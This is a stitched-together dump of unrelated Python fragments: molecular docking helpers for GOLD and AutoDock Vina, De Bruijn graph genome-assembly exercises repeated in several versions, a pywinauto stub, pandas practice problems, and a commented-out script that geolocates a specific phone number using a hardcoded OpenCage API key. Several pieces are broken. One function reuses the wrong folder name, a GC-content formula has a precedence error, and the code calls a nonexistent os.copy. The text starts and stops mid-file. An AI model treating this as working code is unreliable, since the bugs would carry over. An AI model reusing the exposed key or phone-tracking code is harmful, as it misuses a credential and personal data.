    '''Dock from the current settings.

    :param file_name: file name for the settings.  If ``None``, current settings are written to a temporary directory.
    :param mode: one of 'foreground', 'background' or 'interactive'.

    :raises: RuntimeError if no GOLD executable is found.
    '''
    return self.settings._start_gold(file_name=file_name, mode=mode)


@property
def results(self):
    '''The docking results.

    If the docking is still in progress, the results may be partial.
    '''
    pidfile = os.path.join(self.settings.output_directory, 'gold.pid')
    if os.path.exists(pidfile):
        with open(pidfile) as f:
            pid = f.read()
        return_code = None
    else:
        pid = None
        return_code = 0
    return Docker.Results(self.settings, return_code=return_code, pid=pid)


[docs]


def dock_status(self):
    '''Check the status of a docking job via the gold.pid file.'''
    pidfile = os.path.join(self.settings.output_directory, 'gold.pid')
    if os.path.exists(pidfile):
        return 1
    else:
        return 0


[docs]


def copy_settings(self, newdocker):
    '''Copy this docker's settings to another docker instance
    '''
    for fn in self.settings.protein_files:
        newdocker.settings.add_protein_file(fn)

    for ligand_file in self.settings.ligand_files:
        newdocker.settings.add_ligand_file(
            ligand_file.file_name,
            ligand_file.ndocks,
            ligand_file.start,
            ligand_file.finish
        )

    for water_file in self.settings.water_files:
        newdocker.settings.add_water_file(
            water_file.file_name,
            water_file.toggle_state,
            water_file.spin_state,
            water_file.movable_distance
        )

    newdocker.settings.add_specific_fixed_rotatable_bond(self.settings.specific_fixed_rotatable_bonds)

    planar_n_settings = self.settings.flip_planar_nitrogen
    newdocker.settings.set_flip_planar_nitrogen(setting=planar_n_settings['setting'],
                                                ring_NHR=planar_n_settings['ring_NHR'],
                                                ring_NRR=planar_n_settings['ring_NRR'])

    for constraint in self.settings.constraints:
        newdocker.settings.add_constraint(constraint)

    exclusions = ['proteins', 'ligands', 'waters', 'ligand_files',
                  'protein_files', 'water_files', 'specific_fixed_rotatable_bond',
                  'flip_planar_nitrogen', 'constraints']

    simple_attributes = [p for p in dir(Docker.Settings) if
                         p not in exclusions and
                         isinstance(getattr(Docker.Settings, p), property)]

    for attribute in simple_attributes:
        try:
            setattr(newdocker.settings, attribute,
                    getattr(self.settings, attribute))
        except AttributeError:
            pass


def _count_mol_file(self, mol_filename):
    '''Private: count number of molecules in a file

    returns -1 if an error occurs
    '''
    try:
        mol_reader = io.MoleculeReader(mol_filename)
    except IOError:
        return -1
    return len(mol_reader)


def _split_ligand_files(self, maximum_size, ligand_file_lengths={}):
    '''Private: split the ligand files based on a maximum size

    Returns a list of lists of tuples in form [(fn1,start,end),(fn2,start,end)]
    Includes explicit start and end molecules
    If not provided and the original ligand files have 0 for end, it will
      read the file to determine it's size
    '''
    # Let's start by counting ligands in files as needed
    for ligand_file in self.settings.ligand_files:
        try:
            count = ligand_file_lengths[ligand_file.file_name]
        except KeyError:
            # we have to read this file to get the length unless the ligand count is set
            if ligand_file.finish != 0:
                ligand_file_lengths[ligand_file.file_name] = ligand_file.finish - ligand_file.start
            else:
                mr = io.MoleculeReader(ligand_file.file_name)
                ligand_file_lengths[ligand_file.file_name] = len(mr)

    # This is done as the next file will start at this position
    maximum_size = maximum_size - 1
    # Now generate the splits
    ligand_file_splits = []
    curcount = 0
    t = []
    for ligand_file in self.settings.ligand_files:
        if curcount + ligand_file_lengths[ligand_file.file_name] <= maximum_size:
            # We can add the whole ligand file entry to this split
            startmol = ligand_file.start
            if ligand_file.finish == 0:
                endmol = ligand_file.start + ligand_file_lengths[ligand_file.file_name]
            else:
                endmol = ligand_file.finish
            if startmol == 0:
                startmol = 1
            t.append(Docker.Settings.LigandFileInfo(
                ligand_file.file_name, ligand_file.ndocks, startmol, endmol
            ))
            curcount += ligand_file_lengths[ligand_file.file_name]
            if curcount == maximum_size:
                ligand_file_splits.append(t[:])
                t = []
                curcount = 0
        else:
            if ligand_file.finish == 0:
                ligand_file = Docker.Settings.LigandFileInfo(
                    ligand_file.file_name,
                    ligand_file.ndocks,
                    ligand_file.start,
                    ligand_file_lengths[ligand_file.file_name]
                )
            try:
                x = endmol
            except NameError:
                endmol = -1
            while endmol != ligand_file.finish:
                try:
                    x = startmol
                except NameError:
                    startmol = ligand_file.start
                    if startmol == 0:
                        startmol = 1
                endmol = startmol + (maximum_size - curcount)

                if endmol > ligand_file.finish:
                    endmol = ligand_file.finish
                cursize = endmol - startmol
                curcount += cursize
                t.append(
                    Docker.Settings.LigandFileInfo(
                        ligand_file.file_name, ligand_file.ndocks, startmol, endmol
                    )
                )
                if endmol == ligand_file.finish:
                    startmol = 1
                else:
                    startmol = endmol + 1
                if curcount == maximum_size:
                    ligand_file_splits.append(t[:])
                    t = []
                    curcount = 0

    ligand_file_splits.append(t[:])

    return ligand_file_splits

##########################################################################

import os


class Docking:

    def __init__(self, path_to_project, project_name, receptors, ligands):
        self.path_to_project = path_to_project
        self.project_name = project_name
        self.receptors = [i for i in receptors]
        self.ligands = [i for i in ligands]

    def createAllFolders(self):
        if not os.path.exists(self.project_name):
            os.mkdir(os.path.join(self.path_to_project, self.project_name))
            os.chdir(os.path.join(self.path_to_project, self.project_name))
            print(f"{self.project_name} created")
            print("Ligand file >>> DONE")
            self.createDatabase()
        else:
            os.chdir(os.path.join(self.path_to_project, self.project_name))
            print(f"folder {self.project_name} already exists in {self.path_to_project}")

    def createDatabase(self):
        database = 'DBs'
        if not os.path.exists(database):
            os.mkdir(os.path.join(os.path.join(self.path_to_project, self.project_name), database))
            print(f"{self.project_name} created")
            print("Database file >>> DONE")
            return os.path.join(os.path.join(self.path_to_project, self.project_name), database)
        else:
            print(f"folder {database} already exists in {os.path.join(self.path_to_project, self.project_name)}")
            return os.path.join(os.path.join(self.path_to_project, self.project_name), database)

    def createReceptor(self):
        receptor_folder = 'Receptor'
        if not os.path.exists(receptor_folder):
            os.mkdir(os.path.join(self.createDatabase(), receptor_folder))
            print(f"{self.project_name} created")
            print("Receptor file >>> DONE")
            return os.path.join(self.createDatabase(), receptor_folder)
        else:
            print(f"folder {receptor_folder} already exists in {os.path.join(self.createDatabase(), receptor_folder)}")
            return os.path.join(self.createDatabase(), receptor_folder)

    def createligands(self):
        ligands_folder = 'Receptor'
        if not os.path.exists(ligands_folder):
            os.mkdir(os.path.join(self.createDatabase(), ligands_folder))
            print(f"{self.project_name} created")
            print("Ligand file >>> DONE")
            return os.path.join(self.createDatabase(), ligands_folder)
        else:
            print(f"folder {ligands_folder} already exists in {os.path.join(self.createDatabase(), ligands_folder)}")
            return os.path.join(self.createDatabase(), ligands_folder)

    def changeDirectory(self):
        os.chdir(self.path_to_project)

# def createProjectFolder(folder_name):
#     if not os.path.exists(folder_name):
#         os.mkdir(os.path.join(os.getcwd(), folder_name))
#         print(f"{folder_name} created")
#     else:
#         print(f"folder {folder_name} already exists in {os.getcwd()}")
#
# # def getVinaFromPC(folder_name):
#
#
#
# # make the confg file for auto dock
# # def make_confg_file(folder_name):
# #     confg_file = open(folder_name + "/config.txt", "w")
# #     confg_file.write(f"auto_dock_folder: {folder_name}\n")
# #     confg_file.close()
# #     print(f"config.txt created in {folder_name}")
# #     return True
#
#
# # uploadReceptor
#
# # uploadLigand
#
# # makeConfAutodock
#
# # parse result
#
# # result df
#
# path = 'yehia'
# make_new_folder(path)
# database_name = 'DBs'
# createDatabase(database_name)
# result = 'result'
# createResult(result)
# import os
# import re
# import pandas as pd
# import shutil
#
# def make_new_project_folder(project_name):
#     path_to_project = input("Enter the path to the project: ")
#     project_folder = os.path.join(path_to_project, project_name)
#     os.makedirs(project_folder, exist_ok=True)
#     print("Project folder >>> DONE")
#     return project_folder
#
# def upload_receptor(project_path, DB=False):
#     if DB:
#         receptor_files = [file for file in os.listdir("DB") if file.endswith(".pdbqt")]
#         for receptor_file in receptor_files:
#             shutil.copy2(os.path.join("DB", receptor_file), project_path)
#     else:
#         receptor_files = input("Enter the path to the receptor files: ").split()
#         for receptor_file in receptor_files:
#             shutil.copy2(receptor_file, project_path)
#     print("Receptor files >>> DONE")
#
# def upload_ligand(project_path):
#     ligand_file = input("Enter the path to the ligand file: ")
#     shutil.copy2(ligand_file, project_path)
#     print("Ligand file >>> DONE")
#     return os.path.basename(ligand_file)
#
#
# def make_conf_autodock(project_path, DB=False, ligand_name=None):
#     if DB:
#         conf_df = pd.read_csv("DB/DB_DF.csv")
#         ligand_name = re.sub(r'\.pdbqt', '', ligand_name)
#         conf_df["ligand"] = [ligand_name] * len(conf_df)
#     else:
#         conf_df = pd.read_csv(input("Enter the path of the configuration file: "))
#
#     project_path = re.sub(r'\\', '/', project_path)
#     os.system(f"cp autodock/vina.exe {project_path}")
#
#     for i, row in conf_df.iterrows():
#         with open("autodock/docking.conf", "r") as f:
#             conf = f.read()
#         conf = re.sub(r're_x', f'{row[0]}.pdbqt', conf)
#         conf = re.sub(r'l_x', f'{row[1]}.pdbqt', conf)
#         conf = re.sub(r'c_x', str(row[2]), conf)
#         conf = re.sub(r'c_y', str(row[3]), conf)
#         conf = re.sub(r'c_z', str(row[4]), conf)
#         conf = re.sub(r's_x', str(row[5]), conf)
#         conf = re.sub(r's_y', str(row[6]), conf)
#         conf = re.sub(r's_z', str(row[7]), conf)
#         conf = re.sub(r'out_x', f'{row[0]}_result.pdbqt', conf)
#
#         with open(f"{project_path}/{row[0]}.conf", "w") as f:
#             f.write(conf)
#
#         run_shell = f"vina.exe --config {row[0]}.conf"
#         with open(f"{project_path}/run.bat", "w") as f:
#             f.write(run_shell)
#
#         os.system(f"cd {project_path} && ./run.bat")
import pywintypes

# import os
# import string
# import pandas as pd
#
#
# def make_new_project_folder(project_name):
#     path_to_project = input("Enter the path to the project: ")
#     os.makedirs(os.path.join(path_to_project, project_name))
#     print("Project folder >>> DONE")
#     return os.path.join(path_to_project, project_name)
#
#
# def upload_receptor(project_path, DB=False):
#     if DB:
#         project_path = project_path.replace("\\", "/")
#         pdb_files = [f for f in os.listdir("DB/") if f.endswith(".pdbqt")]
#         for pdb in pdb_files:
#             os.copy(os.path.join("DB/", pdb), project_path)
#     else:
#         project_path = project_path.replace("\\", "/")
#         pdb_files = input("Enter the path to the receptor files: ").split()
#         for pdb in pdb_files:
#             os.copy(pdb, project_path)
#         print("Receptor files >>> DONE")
#
#
# def upload_ligand(project_path):
#     project_path = project_path.replace("\\", "/")
#     ligand_path = input("Enter the path to the ligand file: ")
#     os.copy(ligand_path, project_path)
#     print("Ligand file >>> DONE")
#     return os.path.basename(ligand_path)
#
#
# def make_conf_autodock(project_path, DB=False, ligand_name=None):
#     if DB:
#         conf_df = pd.read_csv("DB/DB_DF.csv")
#         ligand_name = ligand_name.rstrip(".pdbqt")
#         conf_df["ligand"] = [ligand_name] * len(conf_df)
#     if not DB:
#         conf_df = pd.read_csv(input("Enter the path to the configuration file: "))
#     project_path = project_path.replace("\\", "/")
#     os.copy("autodock/vina.exe", project_path)
#     for i in range(len(conf_df)):
#         with open("autodock/docking.conf") as f:
#             read_conf = f.readlines()
#         read_conf = [x.replace("re_x", f"{conf_df.iloc[i, 0]}.pdbqt") for x in read_conf]
#         read_conf = [x.replace("l_x", f"{conf_df.iloc[i, 1]}.pdbqt") for x in read_conf]
#         read_conf = [x.replace("c_x", str(conf_df.iloc[i, 2])) for x in read_conf]
#         read_conf = [x.replace("c_y", str(conf_df.iloc[i, 3])) for x in read_conf]
#         read_conf = [x.replace("c_z", str(conf_df.iloc[i, 4])) for x in read_conf]


# """
#     this function is used to create a new folder and change directory to the current folder that created
#     input:
#         :param folder name - the name of the folder you want to create : folder_name
#     output:
#         :returns directory - path : path after creating folder and change directory to current folder that created
# """
# def make_new_folder(folder_name):
#     if not os.path.exists(folder_name):
#         os.mkdir(os.path.join(os.getcwd(), folder_name))
#         os.chdir(os.path.join(os.getcwd(), folder_name))
#         print(f"{folder_name} created")
#     else:
#         os.chdir(os.path.join(os.getcwd(), folder_name))
#         print(f"folder {folder_name} already exists in {os.getcwd()}")
#
#
# # create Database folder
# def createDatabase(folder_name):
#     if not os.path.exists(folder_name):
#         os.mkdir(os.path.join(os.getcwd(), folder_name))
#         print(f"{folder_name} created")
#     else:
#         os.chdir(os.path.join(os.getcwd(), folder_name))
#         print(f"folder {folder_name} already exists in {os.getcwd()}")

# import os
# import re
# import shutil
# import pandas as pd
#
# path_to_project = input("Enter the path to the project: ")
# project_name = input('Enter the project name')
#
#
# def createDatabase():
#     database = 'DBs'
#     if not os.path.exists(project_name):
#         os.mkdir(os.path.join(os.path.join(path_to_project, project_name),database))
#         os.chdir(os.path.join(os.path.join(path_to_project, project_name),database))
#         print(f"{project_name} created")
#         print("Ligand file >>> DONE")
#     else:
#         os.chdir(os.path.join(os.path.join(path_to_project, project_name),database))
#         print(f"folder {database} already exists in {os.path.join(path_to_project, project_name)}")
#
#
# def createProjectFolder():
#     if not os.path.exists(project_name):
#         os.mkdir(os.path.join(path_to_project, project_name))
#         os.chdir(os.path.join(path_to_project, project_name))
#         print(f"{project_name} created")
#         print("Ligand file >>> DONE")
#     else:
#         os.chdir(os.path.join(path_to_project, project_name))
#         print(f"folder {project_name} already exists in {path_to_project}")


# def upload_ligand():
#     ligand_file = input("Enter the path to the ligand file: ")
#     if ligand_file:
#         shutil.copy(ligand_file, project_name)
#         print("Ligand file >>> DONE")
#         return os.path.basename(ligand_file)
#     else:
#         print('Wrong entry')

# createProjectFolder()
# createDatabase()
# upload_ligand()
# def upload_receptor(project_path, DB=False):
#     if DB:
#         path_to_DB = input("Enter the path to the receptor database: ")
#         receptor_files = [os.path.join(path_to_DB, f) for f in os.listdir(path_to_DB) if f.endswith(".pdbqt")]
#         for receptor in receptor_files:
#             shutil.copy(receptor, project_path)
#     else:
#         receptor_files = input(
#             "Enter the path to the receptor file(s), separated by commas: ").split(",")
#         for receptor in receptor_files:
#             shutil.copy(receptor.strip(), project_path)
#     print("Receptor files >>> DONE")


# def make_conf_autodock(project_path, DB=False, ligand_name=None):
#     if DB:
#         conf_df = pd.read_csv("DB/DB_DF.csv")
#         ligand_name = re.sub(r'.pdbqt', '', ligand_name)
#         conf_df['ligand'] = [ligand_name] * conf_df.shape[0]
#     if not DB:
#         conf_df = pd.read_csv(input("Enter file path: "))
#     project_path = re.sub(r'\\', '/', project_path)
#     os.system(f'cp autodock/vina.exe {project_path}')
#     for i_conf in range(conf_df.shape[0]):
#         with open("autodock/docking.conf", "r") as file:
#             read_conf = file.read()
#         read_conf = re.sub(
#             r're_x', f'{conf_df.iloc[i_conf, 0]}.pdbqt', read_conf)
#         read_conf = re.sub(
#             r'l_x', f'{conf_df.iloc[i_conf, 1]}.pdbqt', read_conf)
#         read_conf = re.sub(r'c_x', str(conf_df.iloc[i_conf, 2]), read_conf)
#         read_conf = re.sub(r'c_y', str(conf_df.iloc[i_conf, 3]), read_conf)
#         read_conf = re.sub(r'c_z', str(conf_df.iloc[i_conf, 4]), read_conf)
#         read_conf = re.sub(r's_x', str(conf_df.iloc[i_conf, 5]), read_conf)
#         read_conf = re.sub(r's_y', str(conf_df.iloc[i_conf, 6]), read_conf)
#         read_conf = re.sub(r's_z', str(conf_df.iloc[i_conf, 7]), read_conf)
#         read_conf = re.sub(
#             r'out_x', f'{conf_df.iloc[i_conf, 0]}_result.pdbqt', read_conf)
#         with open(f'{project_path}/{conf_df.iloc[i_conf, 0]}.conf', 'w') as file:
#             file.write(read_conf)
#         os.system(f'cd {project_path} && ./vina.exe --config {conf_df.iloc[i_conf, 0]}.conf')


# def parse_result(project_path):
#     get_result_files = [f for f in os.listdir(project_path) if re.search("_result", f)]
#     all_results = ""
#     for i_read in get_result_files:
#         with open(os.path.join(project_path, i_read), "r") as file:
#             read_result = file.readlines()[:2]
#             receptor_name = re.sub("_result.pdbqt", "", os.path.basename(i_read))
#             read_result[0] = receptor_name + " affinity(Kcal/mol) | rmsd l.b. | rmsd u.b."
#             model_result = "\n".join(read_result)
#             print(model_result)
#             print("\n")
#             all_results += "\n" + model_result
#     with open(os.path.join(project_path, "summary_output.txt"), "w") as file:
#         file.write(all_results)
#
#
# def parse_result(project_path):
#     result_files = [f for f in os.listdir(project_path) if '_result' in f]
#     all_results = ''
#     for i_read in result_files:
#         with open(i_read) as f:
#             read_result = f.readlines()[:2]
#             receptor_name = os.path.basename(
#                 i_read).replace('_result.pdbqt', '')
#             read_result[0] = receptor_name +' affinity(Kcal/mol) | rmsd l.b. | rmsd u.b.' + '\n'
#             model_result = ''.join(read_result)
#             print(model_result)
#             all_results += '\n' + model_result
#     with open(os.path.join(project_path, 'summary_output.txt'), 'w') as f:
#         f.write(all_results)


# def result_df(project_path):
#     with open(os.path.join(project_path, 'summary_output.txt')) as f:
#         result_df = f.readlines()[2:12:2]
#         result_df = [row.replace(' ', '\t') for row in result_df]
#         result_df = [row.split('\t') for row in result_df]
#
#         final_df = pd.DataFrame({'receptor': ['1DNU', '1N8Q', '1OG5', '2CDU', '2ckj'],
#                                  'affinity(Kcal/mol)': ['NONE'] * 5,
#                                  'rmsd l.b.': ['NONE'] * 5,
#                                  'rmsd u.b.': ['NONE'] * 5})
#
#         count = 0
#         for i in result_df:
#             count += 1
#             c_df = []
#             for j in i:
#                 try:
#                     c_df.append(float(j))
#                 except:
#                     pass
#             final_df.iloc[count - 1, 1:] = c_df
#
#         return final_df
#
# import os
#
# project_path = ''
# project_name = ''
#
#
#
#
#
# def makeFolder(project_path, project_name):
#     os.mkdir(os.path.join(project_path, project_name))
#
#
# if __name__ == '__main__':
#     project_path = input('enter project path')
#     project_name = input("enter your project name")



from pywinauto.application import Application

app = Application(backend='uia')

app.start()
# # def Reader(loc="data(lecture 2).fastq"):
# #     with open(loc, 'r') as f:
# #         Reads = []
# #         Phred = []
# #         i = 1
# #         for line in f:
# #             if i == 2:
# #                 Reads.append(line.rstrip())
# #             elif i == 4:
# #                 Phred.append(line.rstrip())
# #                 i = 0
# #             i += 1
# #         return (Reads, Phred)
# #
# # def getdup(reads):
# #     duplictaed = {}
# #     for seq in reads:
# #         duplictaed[seq] = reads.count(seq)
# #     return duplictaed
# #
# # reads,phred=Reader()
# #
# #
# #
# # def getGC(reads):
# #     gc = {}
# #     for seq in reads:
# #         gc[seq] = seq.count("C")+seq.count("G")/len(seq)
# #     return gc
# # def getquilty(reads):
# #     list2=list()
# #     for i in range(151):
# #         list1=[]
# #         for x in reads:
# #             list1.append(ord(x[i])-33)
# #         list2.append(sum(list1)/len(list1))
# #
#
#
# from Bio.PDB import PDBParser, PDBIO
#
# def mutate_residue(pdb_file, chain_id, residue_id, new_residue_type):
#     """
#     Mutates a residue in a PDB file.
#
#     Args:
#         pdb_file (str): The path to the PDB file.
#         chain_id (str): The chain ID of the residue to mutate.
#         residue_id (int): The residue ID of the residue to mutate.
#         new_residue_type (str): The three-letter code of the new residue type.
#
#     Returns:
#         None
#     """
#     # Parse the PDB file
#     parser = PDBParser()
#     structure = parser.get_structure('structure', pdb_file)
#
#     # Get the residue to mutate
#     residue = structure[0][chain_id][(' ', residue_id, ' ')]
#
#     # Create the new residue
#     # new_residue = residue.copy()
#     # new_residue.resname = new_residue_type
#     #
#     # # Replace the old residue with the new residue
#     # structure[0][chain_id].detach_child(residue.id)
#     # structure[0][chain_id].add(new_residue)
#     #
#     # # Save the new PDB file
#     # io = PDBIO()
#     # io.set_structure(structure)
#     # io.save('mutated_6lu7.pdb')
#
#
#
# mutate_residue('6lu7.pdb', 'A',1, 'ALA')
#
#
#
#












from collections import defaultdict
# import networkx, matplotlib.pyplot as plot



def kmers(seq, k):
    return [seq[i:i + k] for i in range(len(seq) - k + 1)]


def DeBruijnGraph(reads, k):
    dicti = {}
    E = []
    for read in reads:
        KMers = kmers(read, k)
        edges = [kmers(mer, k - 1) for mer in KMers]
        for edge in edges:
            if edge[0] not in dicti.keys(): dicti[edge[0]] = []
            if edge[1] not in dicti.keys(): dicti[edge[1]] = []
            dicti[edge[0]].append(edge[1])
            E.append(edge)
    V = list(dicti.keys())
    graph = {'nodes': V, 'edges': E}
    print(graph)
    return (graph, dicti)



def generate_eulerian_path(dna_seq,k):
    graph,de_bruijn_graph = DeBruijnGraph(dna_seq,k)
    path = []
    stack = [list(de_bruijn_graph.keys())[len(list(de_bruijn_graph.keys()))-len(dna_seq)]]
    while stack:
        u = stack[-1]
        if de_bruijn_graph[u]:
            stack.append(de_bruijn_graph[u].pop())
        else:
            path.append(stack.pop())
    arr=[]
    arr.extend(path[::-1])
    return arr



dna_seq = ['TTACGTT', 'CCGTTA', 'GTTAC', 'GTTCGA', 'CGTTC']
graph,dicti=DeBruijnGraph(dna_seq,5)
eulerian_path = generate_eulerian_path(dna_seq,5)
print("Eulerian Path: ", eulerian_path)
# import Bio
# from Bio import Seq
#
# seq=Seq.Seq('')
# q='AGTC'
# with open('seq.txt') as f:
#     lines = [line.rstrip() for line in f]
#     for i in lines:
#         seq+=i.strip()
# translation=seq.translate()
# transcrption=seq.transcribe()
# print(translation)
# print(transcrption)


# -*- coding: utf-8 -*-
"""
Created on Wed Apr 26 20:27:59 2023

@author: lion
"""

import networkx, matplotlib.pyplot as plot

# Exercise 1
def kmers(sequence, k):
    n = len(sequence)
    kmers_list = []
    for i in range(n - k + 1):
        kmers_list += [sequence[i:i+k]]
    return kmers_list

# Exercise 2
def DeBruijnGraph(reads, k): # Steps in lecture 4 (slide 31)
    all_kmers = []
    for read in reads: # Step 1(b)
        all_kmers += kmers(read, k)

    graph = {'nodes':[], 'edges':[]} # Step 2

    for kmer in all_kmers: # Step 3
        prefix, suffix = kmer[:-1], kmer[1:]
        if prefix not in graph['nodes']: # (a)
            graph['nodes'] += [prefix]
        if suffix not in graph['nodes']: # (b)
            graph['nodes'] += [suffix]
        graph['edges'] += [[prefix, suffix]] # (c)

    return graph

def visualizeDBGraph(graph):
    dbGraph = networkx.DiGraph()
    
    dbGraph.add_nodes_from(graph['nodes']) #Add the nodes to the graph
    dbGraph.add_edges_from(graph['edges']) #Add the edges to the graph
    
    networkx.draw(dbGraph, with_labels=True, node_size=1000)
    plot.show()


        
#main()        
        
def build_degrees(graph, _in):
    assert _in == 1 or _in == 0, "_in must be 0 or 1"
    degrees = {}
    for node in graph['nodes']:
        degrees[node] = 0
        
    for node in graph['nodes']:
        for edge in graph['edges']:
            if node == edge[_in]: # When _in = 0, we are building the out-degrees, so we check that the node is a prefix by node == edge[_in]
                degrees[node] += 1
    return degrees

def buildAdjacencyList(graph):
    adjacencyList = {}
    for node in graph['nodes']:
        adjacencyList[node] = []

    for node in graph['nodes']:
        for edge in graph['edges']:
            if node == edge[0]: # We check that the node is a prefix by node == edge[0]
                adjacencyList[node] += [edge[1]] # We add its suffix to its adjacency list

    return adjacencyList

# Exercise 1
def GetStartNode(graph):
    _in = build_degrees(graph, _in = 1)
    out = build_degrees(graph, _in = 0) # _in = 0 means that we are building the out-degrees
    for node in graph['nodes']:
        if _in[node] == out[node] - 1:
            return node

def EulerianPath(graph): # Steps in lecture 5 (slide 7)        
        adjacencyList = buildAdjacencyList(graph)
        pathList = [] # Step 1
        startNode = GetStartNode(graph) # Step 2
        currentNode = startNode # Step 3

        def DFS(v):
            for u in adjacencyList[v]: # a
                adjacencyList[v].remove(u) # i
                DFS(u) # ii
            nonlocal pathList
            pathList += [v] # b
            
        DFS(currentNode) # Step 4
        return pathList

# Exercise 2
def AssembleGenome(pathList): # Steps in lecture 5 (slide 7)
    pathList = pathList[::-1] # Step 1
    genome = pathList[0] # Step 2
    for i in range(1,len(pathList)):
        genome += pathList[i][-1] # Step 3
    return genome
        
   

#main()  
        
        


k = None

# Exercise
def mergeChains(graph,k): # Lecture 6 (slide 17)
    _in = build_degrees(graph, _in = 1)
    out = build_degrees(graph, _in = 0)
    canMerge = True
    
    while canMerge:
        canMerge = False
        for edge in graph['edges']: # Condition 1
            A = edge[0] 
            B = edge[1]
            if out[A] == _in[B] == 1: # Condition 2
                canMerge = True
                #Merge
                graph['edges'].remove(edge)
                graph['nodes'].remove(A); graph['nodes'].remove(B)
                newNode = A + B[k-1:]
                graph['nodes'].append(newNode) # Update nodes
                
                for e in graph['edges']: # Update edges
                    if e[0] == B:
                        e[0] = newNode
                    if e[1] == A:
                        e[1] = newNode
                
                _in[newNode] = _in[A]; out[newNode] = out[B] # Update in and out degrees
                _in.pop(A); _in.pop(B)
                out.pop(A); out.pop(B)
                
    return graph

def main():
    global k
    k = 4
    graph = DeBruijnGraph(['TTACGTT','CCGTTA','GTTAC','GTTCGA','CGTTC'],5)
    # visualizeDBGraph(graph)
    newGraph = mergeChains(graph,k)
    # visualizeDBGraph(newGraph)
    print(newGraph)
    # Example in lecture 6 (slide 18)
    k = 3
    # graph2 = {'nodes':['GAC', 'ACC', 'CCG', 'CGT', 'GTA', 'TAA', 'AAT', 'TAG', 'ACT', 'CTG', 'TGT'],
    #           'edges':[['GAC', 'ACC'], ['GAC', 'ACT'], ['ACC', 'CCG'], ['CCG', 'CGT'], ['CGT', 'GTA'], ['GTA', 'TAA'], ['TAA', 'AAT'],
    #                    ['GTA', 'TAG'], ['ACT', 'CTG'], ['CTG','TGT'], ['TGT', 'GTA']]}
    # visualizeDBGraph(graph2)
    # newGraph = mergeChains(graph2,k)
    # visualizeDBGraph(newGraph)
    print(newGraph)
main()     
import networkx, matplotlib.pyplot as plot

# Exercise 1
def kmers(sequence, k):
    n = len(sequence)
    kmers_list = []
    for i in range(n - k + 1):
        kmers_list += [sequence[i:i+k]]
    return kmers_list

# Exercise 2
def DeBruijnGraph(reads, k): # Steps in lecture 4 (slide 31)
    all_kmers = []
    for read in reads: # Step 1(b)
        all_kmers += kmers(read, k)

    graph = {'nodes':[], 'edges':[]} # Step 2

    for kmer in all_kmers: # Step 3
        prefix, suffix = kmer[:-1], kmer[1:]
        if prefix not in graph['nodes']: # (a)
            graph['nodes'] += [prefix]
        if suffix not in graph['nodes']: # (b)
            graph['nodes'] += [suffix]
        graph['edges'] += [[prefix, suffix]] # (c)

    return graph

def visualizeDBGraph(graph):
    dbGraph = networkx.DiGraph()
    
    dbGraph.add_nodes_from(graph['nodes']) #Add the nodes to the graph
    dbGraph.add_edges_from(graph['edges']) #Add the edges to the graph
    
    networkx.draw(dbGraph, with_labels=True, node_size=1000)
    plot.show()

def main():
    graph = DeBruijnGraph(['TTACGTT','CCGTTA','GTTAC','GTTCGA','CGTTC'],5)
    visualizeDBGraph(graph)
        
#main()        
        
def build_degrees(graph, _in):
    assert _in == 1 or _in == 0, "_in must be 0 or 1"
    degrees = {}
    for node in graph['nodes']:
        degrees[node] = 0
        
    for node in graph['nodes']:
        for edge in graph['edges']:
            if node == edge[_in]: # When _in = 0, we are building the out-degrees, so we check that the node is a prefix by node == edge[_in]
                degrees[node] += 1
    return degrees

def buildAdjacencyList(graph):
    adjacencyList = {}
    for node in graph['nodes']:
        adjacencyList[node] = []

    for node in graph['nodes']:
        for edge in graph['edges']:
            if node == edge[0]: # We check that the node is a prefix by node == edge[0]
                adjacencyList[node] += [edge[1]] # We add its suffix to its adjacency list

    return adjacencyList

# Exercise 1
def GetStartNode(graph):
    _in = build_degrees(graph, _in = 1)
    out = build_degrees(graph, _in = 0) # _in = 0 means that we are building the out-degrees
    for node in graph['nodes']:
        if _in[node] == out[node] - 1:
            return node

def EulerianPath(graph): # Steps in lecture 5 (slide 7)        
        adjacencyList = buildAdjacencyList(graph)
        pathList = [] # Step 1
        startNode = GetStartNode(graph) # Step 2
        currentNode = startNode # Step 3

        def DFS(v):
            for u in adjacencyList[v]: # a
                adjacencyList[v].remove(u) # i
                DFS(u) # ii
            nonlocal pathList
            pathList += [v] # b
            
        DFS(currentNode) # Step 4
        return pathList

# Exercise 2
def AssembleGenome(pathList): # Steps in lecture 5 (slide 7)
    pathList = pathList[::-1] # Step 1
    genome = pathList[0] # Step 2
    for i in range(1,len(pathList)):
        genome += pathList[i][-1] # Step 3
    return genome
        
from Lecture_4 import DeBruijnGraph

def main():
    graph = DeBruijnGraph(['TTACGTT','CCGTTA','GTTAC','GTTCGA','CGTTC'],5)
    path = EulerianPath(graph)
    print(path)
    print(AssembleGenome(path))

#main()  
        
        
# import phonenumbers as ph
# from phonenumbers import geocoder
# from phonenumbers import carrier
# number = "+201141345829"
# pepnum=ph.parse(number)
# location=geocoder.description_for_number(pepnum,"en")
# print(location)
#
# server=ph.parse(number)
# print(carrier.name_for_number(server,"en"))
#
#
# import opencage
# import folium
# from opencage.geocoder import OpenCageGeocode
# key="6d42399705a14715ad777499c97d8f4e"
# geocode= OpenCageGeocode(key)
# query=str(location)
# restults= geocode.geocode(query)
# # print(restults)
#
# lat=restults[0]['geometry']['lat']
# lng=restults[0]['geometry']['lng']
#
# print(lat,lng)
#
# mymap=folium.Map(location=[lat,lng],zoom_start=9)
# folium.Marker([lat,lng],popup=location).add_to(mymap)
# mymap.save('aaaalocation.html')


import pandas as pd

# problem 1 get the version of pandas
# print(pd.__version__)

# problem 2 convert to series data in pandas
# stocks = ['PLW', 'CDR', '11B', 'TEN']
# print(pd.Series(data=stocks))

# problem 3 print series of data set with pandas
# stocks = {'PLW': 387.00, 'CDR': 339.5, 'TEN': 349.5, '11B': 391.0}
# print(pd.Series(stocks))

# problem 4 convert it to a list
# stocks = {'PLW': 387.00, 'CDR': 339.5, 'TEN': 349.5, '11B': 391.0}
# quotations = pd.Series(data=stocks).tolist()
# print(quotations)

# problem 5 name column of dataset
# stocks = {'PLW': 387.00, 'CDR': 339.5, 'TEN': 349.5, '11B': 391.0}
# quotations = pd.Series(data=stocks)
# quotations =pd.DataFrame(quotations,columns=['price'])
# print(quotations)

# problem 6 make a range by numpy and print it
# print(pd.Series(data=np.arange(10, 100, 10), index=np.arange(101, 110), dtype='float'))

# problem 7 convert to type int
# series = pd.Series(['001', '002', '003', '004'], list('abcd')).astype(int)
# print(series)
# or
# series = pd.to_numeric(series)
# print(series)

# problem 8
